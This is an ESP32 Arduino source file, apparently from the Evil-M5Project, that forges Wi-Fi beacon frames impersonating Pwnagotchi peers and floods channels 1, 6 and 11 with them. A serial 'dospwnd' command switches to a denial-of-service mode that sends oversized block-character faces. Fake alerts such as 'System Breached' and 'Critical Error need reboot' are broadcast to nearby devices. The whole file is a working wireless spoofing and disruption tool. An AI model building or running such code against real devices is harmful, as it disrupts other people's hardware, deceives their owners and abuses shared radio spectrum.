/*
MIT License

Copyright (c) 2024 7h30th3r0n3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

In addition, all copies or substantial portions of the Software must give
appropriate credit to the original author by linking to the original repository
and mentioning the author's name.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "ArduinoJson.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "nvs_flash.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "driver/uart.h"

#define SERIAL_PORT UART_NUM_0
#define SERIAL_BAUDRATE 115200

volatile bool stop_beacon = false;
volatile bool dos_pwnd = false;

// Define the raw beacon frame
const uint8_t beacon_frame_template[] = {
  0x80, 0x00,                          // Frame Control
  0x00, 0x00,                          // Duration
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination Address (Broadcast)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // Source Address (SA)
  0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,  // BSSID
  0x00, 0x00,                          // Sequence/Fragment number
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
  0x64, 0x00,  // Beacon interval
  0x11, 0x04   // Capability info
};

// Function to send the beacon frame
void send_beacon(uint8_t channel, const char* face, const char* name) {
  DynamicJsonDocument json(2048);
  json["pal"] = true;
  json["name"] = name;
  json["face"] = face;
  json["epoch"] = 1;
  json["grid_version"] = "1.10.3";
  json["identity"] = "32e9f315e92d974342c93d0fd952a914bfb4e6838953536ea6f63d54db6b9610";
  json["pwnd_run"] = 0;
  json["pwnd_tot"] = 0;
  json["session_id"] = "a2:00:64:e6:0b:8b";
  json["timestamp"] = 0;
  json["uptime"] = 0;
  json["version"] = "1.8.4";
  json["policy"]["advertise"] = true;
  json["policy"]["bond_encounters_factor"] = 20000;
  json["policy"]["bored_num_epochs"] = 0;
  json["policy"]["sad_num_epochs"] = 0;
  json["policy"]["excited_num_epochs"] = 9999;

  String json_str;
  serializeJson(json, json_str);

  uint16_t json_len = json_str.length();
  uint8_t header_len = 2 + ((json_len / 255) * 2);
  uint8_t beacon_frame[sizeof(beacon_frame_template) + json_len + header_len];
  memcpy(beacon_frame, beacon_frame_template, sizeof(beacon_frame_template));

  // Add JSON data to the beacon frame
  int frame_byte = sizeof(beacon_frame_template);
  for (int i = 0; i < json_len; i++) {
    if (i == 0 || i % 255 == 0) {
      beacon_frame[frame_byte++] = 0xde;  // AC = 222
      uint8_t payload_len = 255;
      if (json_len - i < 255) {
        payload_len = json_len - i;
      }
      beacon_frame[frame_byte++] = payload_len;
    }
    beacon_frame[frame_byte++] = (uint8_t)json_str[i];
  }

  // Set the channel and send the frame
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);

  // Print the feedback to the serial monitor
  Serial.printf("Beacon sent:\nChannel: %d\nFace: %s\nName: %s\n--------------\n", channel, face, name);
}

// Task to send beacon frames with changing face, name, and channel
void beacon_task(void* pvParameters) {
  const char* regular_faces[] = {
    "(STOP)", "♬♪♬♪♬♪♬", "(X‿‿X)", "(u W u)", "(EVIL)", "(.)(.)", "ლ(o_oლ)", "(O﹏o)", "(✖╭╮✖)", "SKIDZ!", "(ɹoɹɹƎ)", "(H4cK)", "NOPWND!\n■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■",
  };

  const char* regular_names[] = {
    "Check Evil-M5Project", "┌∩┐(◣_◢)┌∩┐", "(╯°□°)╯╭╮(XoX)", "STOP DEAUTH SKIDZ!", "System Breached oups", "Unauthorized  Access", "Security  Compromised.. reboot", "Warning...Evil-M5 here", "Critical Error need reboot", "No more Battery", "Never gonna give you up", "Never gonna let you down", "Never gonna run around", "and desert you", "Never gonna make you cry", "Never gonna say goodbye", "Never gonna tell a lie", "and hurt you"
  };

  const char* pwnd_faces[] = {
    "NOPWND!\n■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■"
  };

  const char* pwnd_names[] = {
    "Am I blocking the view?"
  };

  const uint8_t channels[] = {1, 6, 11}; // List of Wi-Fi channels to use

  const int num_regular_faces = sizeof(regular_faces) / sizeof(regular_faces[0]);
  const int num_pwnd_faces = sizeof(pwnd_faces) / sizeof(pwnd_faces[0]);
  const int num_channels = sizeof(channels) / sizeof(channels[0]);

  while (true) {
    if (!stop_beacon) {
      if (dos_pwnd) {
        // Send PWND beacons
        for (int i = 0; i < num_pwnd_faces; ++i) {
          for (int ch = 0; ch < num_channels; ++ch) {
            if (stop_beacon) {
              break;
            }
            send_beacon(channels[ch], pwnd_faces[i], pwnd_names[i]);
            vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
          }
        }
      } else {
        // Send regular beacons
        for (int i = 0; i < num_regular_faces; ++i) {
          for (int ch = 0; ch < num_channels; ++ch) {
            if (stop_beacon) {
              break;
            }
            send_beacon(channels[ch], regular_faces[i], regular_names[i]);
            vTaskDelay(200 / portTICK_PERIOD_MS);  // Wait 200 ms
          }
        }
      }
    } else {
      vTaskDelay(1000 / portTICK_PERIOD_MS);  // Wait 1 second before checking again
    }
  }
}

// Task to read serial commands
void serial_task(void* pvParameters) {
  char command[32];
  while (true) {
    if (Serial.available() > 0) {
      int len = Serial.readBytesUntil('\n', command, sizeof(command) - 1);
      command[len] = '\0';  // Add null terminator
      if (strcmp(command, "stop") == 0) {
        stop_beacon = true;
        Serial.println("Beacon transmission stopped.");
      } else if (strcmp(command, "start") == 0) {
        stop_beacon = false;
        Serial.println("Beacon transmission started.");
      } else if (strcmp(command, "dospwnd") == 0) {
        dos_pwnd = true;
        stop_beacon = false;
        Serial.println("PWND Beacon transmission started.");
      } else if (strcmp(command, "stopdospwnd") == 0) {
        dos_pwnd = false;
        stop_beacon = false;
        Serial.println("Regular Beacon transmission started.");
      } else {
        Serial.println("Unknown command.");
      }
    }
    vTaskDelay(100 / portTICK_PERIOD_MS);  // Wait 100 ms
  }
}

void setup() {
  // Initialize NVS
  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  ESP_ERROR_CHECK(ret);

  // Initialize Wi-Fi configuration
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
  ESP_ERROR_CHECK(esp_wifi_start());

  // Initialize the serial interface
  Serial.begin(SERIAL_BAUDRATE);

  // Create tasks
  xTaskCreate(&beacon_task, "beacon_task", 4096, NULL, 5, NULL);
  xTaskCreate(&serial_task, "serial_task", 2048, NULL, 5, NULL);
}

void loop() {
  // Do nothing here, tasks are running in FreeRTOS
}
